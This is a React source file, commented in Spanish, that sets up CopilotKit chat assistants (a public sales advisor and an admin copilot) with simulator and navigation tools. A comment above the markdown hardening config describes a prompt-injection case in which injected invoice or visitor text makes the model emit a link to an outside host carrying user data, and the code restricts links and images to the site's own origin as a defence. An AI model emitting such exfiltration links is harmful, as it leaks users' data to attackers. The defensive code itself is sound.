// Asistentes con CopilotKit (UI) sobre los endpoints AG-UI propios del Worker.
// Lo carga Lanzador.jsx al primer clic: CopilotKit pesa mas que toda la app.
//
// agents__unsafe_dev_only es la forma de conectar un agente AG-UI propio sin
// CopilotRuntime (que hoy no corre en workerd). Pese al nombre, funciona igual
// en produccion; la alternativa "selfManagedAgents" es del plan Enterprise.
// Versiones fijadas en package.json por eso mismo.
import { HttpAgent } from "@ag-ui/client";
import { CopilotKitProvider, CopilotPopup, useAgent, useAgentContext, useConfigureSuggestions, useFrontendTool } from "@copilotkit/react-core/v2";
import "@copilotkit/react-core/v2/styles.css";
import { useState } from "react";
import { BlockPolicy, harden } from "rehype-harden";
import { defaultRehypePlugins } from "streamdown";
import { z } from "zod";

import copy from "../content/site.yaml";
import { navigate, useRoute } from "../lib/route.js";
import { SIMULADOR_EVENTO } from "./Lanzador.jsx";

// Sin esto zod prueba `Function("")` para compilar validadores y la CSP
// (script-src sin unsafe-eval) lo reporta como violacion en cada carga.
z.config({ jitless: true });

// Mismo origen: sin tokens ni cabeceras. Access protege /api/admin/* por cookie.
const AGENTES = {
  asesor: () => new HttpAgent({ url: "/api/sales/asesor" }),
  copiloto: () => new HttpAgent({ url: "/api/admin/copiloto" }),
};


// Streamdown (el markdown de CopilotKit) deja pasar cualquier enlace e imagen.
// Un texto inyectado (una factura, un visitante) podria hacer que el modelo
// escriba [ver](https://otro.sitio/?d=<datos>): fuera del origen propio, los
// enlaces quedan como texto y las imagenes no se cargan. WhatsApp es la salida
// del asesor cuando se agota su cupo diario.
const SOLO_ESTE_ORIGEN = {
  markdownRenderer: {
    rehypePlugins: Object.values({
      ...defaultRehypePlugins,
      harden: [harden, {
        defaultOrigin: window.location.origin,
        allowedLinkPrefixes: [window.location.origin, "https://wa.me/"],
        allowedImagePrefixes: [window.location.origin],
        linkBlockPolicy: BlockPolicy.textOnly,
        imageBlockPolicy: BlockPolicy.remove,
      }],
    }),
  },
};

// Tras ir_a no se vuelve a llamar al modelo: la confirmacion es fija. Ahorra
// una corrida por accion y evita que llama, ya sin la tool a mano, conteste que
// no puede hacer lo que acaba de hacer.
const CONFIRMAR = {
  followUp: false,
  render: ({ result }) => (result ? <p className="asistente-nota">{result}</p> : null),
};

// El simulador devuelve JSON { entradas, resumen }: las entradas son para el
// Worker (recalcula lo que comenta el modelo), el resumen es la nota del chat.
const resumenDe = (result) => { try { return JSON.parse(result).resumen; } catch { return result; } };

function HerramientasAsesor() {
  // Lo que dice el sitio lo pone el Worker en el prompt: el asesor publico
  // ignora el contexto que mande el navegador.
  // El asesor no calcula: llena el formulario y la cifra la da el backend
  // (invariante 7).
  // El contrato que ve el modelo esta en worker/services/asistentes.ts y el
  // Worker ya valida la llamada; este esquema solo tipa el handler.
  useFrontendTool({
    name: "llenar_simulador",
    description: "Llena el simulador de la pagina con los datos del inmueble que dio el visitante. Solo los campos que el visitante menciono.",
    parameters: z.object({
      area_m2: z.coerce.number().positive().max(100000).describe("Area construida en m2"),
      units: z.coerce.number().int().min(1).max(50).optional().describe("Numero de unidades de vivienda"),
      tier: z.enum(["basic", "standard", "premium"]).optional().describe("Calidad de obra"),
      acquisition_cost: z.coerce.number().min(0).optional().describe("Precio de compra en COP"),
      monthly_rent_per_unit: z.coerce.number().min(0).optional().describe("Renta mensual esperada por unidad en COP"),
      monthly_operating_expenses: z.coerce.number().min(0).optional().describe("Gastos mensuales en COP"),
    }),
    // El simulador calcula (backend) y la nota con las cifras queda en el chat:
    // la ventana tapa el panel de resultados en pantallas medianas. Despues el
    // modelo corre otra vez y comenta el escenario (followUp por defecto).
    handler: (datos) => new Promise((listo) => window.dispatchEvent(new CustomEvent(SIMULADOR_EVENTO, { detail: { datos, listo } }))),
    render: ({ result }) => (result ? <p className="asistente-nota">{resumenDe(result)}</p> : null),
  });
  useConfigureSuggestions({ suggestions: copy.asesor.sugerencias.map((s) => ({ title: s, message: s })) });
  return null;
}

const SECCIONES = ["resumen", "insumos", "apus", "simulador", "revision", "orientacion"];
const ruta = (seccion) => (seccion === "resumen" ? "/admin" : `/admin/${seccion}`);

function HerramientasCopiloto() {
  const path = useRoute();
  useAgentContext({ description: "Seccion abierta del control room", value: path });
  useFrontendTool({
    name: "ir_a",
    description: "Abre una seccion del control room: resumen (KPIs), insumos (catalogo y precios), apus (analisis de precios unitarios), simulador (proyecto de obra), revision (facturas que no cerraron), orientacion (guia de uso).",
    parameters: z.object({ seccion: z.enum(SECCIONES) }),
    handler: async ({ seccion }) => { navigate(ruta(seccion)); return `${copy.asistente.seccion_abierta} ${seccion}.`; },
    ...CONFIRMAR,
  });
  return null;
}

// Cabecera propia (slot header de CopilotPopup): estado en linea que pulsa y
// pasa a "escribiendo" mientras corre el agente. Diseno en docs/design/chat.md.
function CabeceraChat({ titleContent, closeButton, tipo }) {
  const { agent } = useAgent();
  const c = copy[tipo]; const comun = copy.asistente;
  const ocupado = agent?.isRunning;
  return <header className="chat-cabecera" data-testid="copilot-modal-header">
    <span className={`chat-estado${ocupado ? " chat-estado-ocupado" : ""}`} aria-hidden="true" />
    <div className="chat-titulo">{titleContent}<small role="status">{ocupado ? comun.estado_ocupado : comun.estado_activo}{c.subtitulo ? ` · ${c.subtitulo}` : ""}</small></div>
    {closeButton}
  </header>;
}

// Slot cursor: se ve mientras el agente piensa y aun no escribe.
const CursorChat = () => <div className="chat-pensando" data-testid="copilot-loading-cursor"><span className="chat-spinner" aria-hidden="true" />{copy.asistente.pensando}</div>;

export default function Asistente({ tipo }) {
  const c = copy[tipo];
  // Un agente por montaje (guarda el hilo). Se registra como "default" porque es
  // el que buscan los hooks de tools, contexto y sugerencias si no se les nombra.
  const [agentes] = useState(() => ({ default: AGENTES[tipo]() }));
  const comun = copy.asistente;
  return <CopilotKitProvider agents__unsafe_dev_only={agentes} enableInspector={false}>
    {tipo === "asesor" ? <HerramientasAsesor /> : <HerramientasCopiloto />}
    <CopilotPopup defaultOpen className="chat-soma"
      header={{ children: (partes) => <CabeceraChat {...partes} tipo={tipo} /> }}
      messageView={{ assistantMessage: SOLO_ESTE_ORIGEN, cursor: CursorChat }} labels={{
      modalHeaderTitle: c.titulo, chatInputPlaceholder: c.placeholder, welcomeMessageText: c.bienvenida,
      chatDisclaimerText: comun.aviso, chatToggleOpenLabel: comun.abrir, chatToggleCloseLabel: comun.cerrar,
      assistantMessageToolbarCopyMessageLabel: comun.copiar, assistantMessageToolbarCopyCodeLabel: comun.copiar, assistantMessageToolbarCopyCodeCopiedLabel: comun.copiado,
    }} />
  </CopilotKitProvider>;
}
